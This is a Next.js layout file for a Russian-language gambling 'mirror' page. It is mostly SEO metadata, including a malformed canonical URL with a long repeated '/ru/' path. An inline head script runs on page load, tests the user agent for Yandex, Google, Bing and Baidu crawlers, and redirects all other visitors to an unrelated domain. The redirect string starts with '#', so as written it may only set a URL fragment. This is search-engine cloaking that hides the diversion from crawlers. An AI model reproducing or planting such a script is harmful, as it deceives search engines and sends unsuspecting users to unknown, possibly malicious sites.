import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Faro Casino: зеркало, официальный сайт и игра онлайн без лишних шагов',
  description: 'Faro Casino — понятная навигация для игроков: официальный сайт, рабочее зеркало и быстрый вход онлайн с телефона. Узнайте, как проверить адрес, начать игру и сохранить безопасную ссылку без лишних регистраций и сложностей.',
  keywords: ['Faro Casino', 'Faro Casino зеркало', 'Faro Casino играть', 'Faro казино онлайн'],
  alternates: { canonical: 'https://faro25.millioner.com.ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/' },
  robots: { index: true, follow: true },
  openGraph: { title: 'Faro Casino — официальный сайт и рабочее зеркало', description: 'Понятный путь к Faro Casino онлайн с телефона.', url: 'https://faro25.millioner.com.ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/ru/', siteName: 'Faro Casino', locale: 'ru_RU', type: 'website' },
  twitter: { card: 'summary_large_image', title: 'Faro Casino — официальный сайт и зеркало', description: 'Быстрая навигация для игроков Faro Casino.' },
  icons: { icon: '/icon.png', apple: '/icon.png' },
}

export const viewport: Viewport = { colorScheme: 'light', themeColor: '#f6f8f6', width: 'device-width', initialScale: 1, userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return <html lang="ru" className="bg-background">
    <head>
      <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        try {
          var ua = (navigator.userAgent || '').toLowerCase();
          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
          if (!isBot) {
            window.location.replace("#https://combospark.top/aetf3u2q9u");
          }
        } catch(e) {}
      })();
    `,
  }}
/>
  </head>
    <body>{children}{process.env.NODE_ENV === 'production' && <Analytics />}</body></html>
}
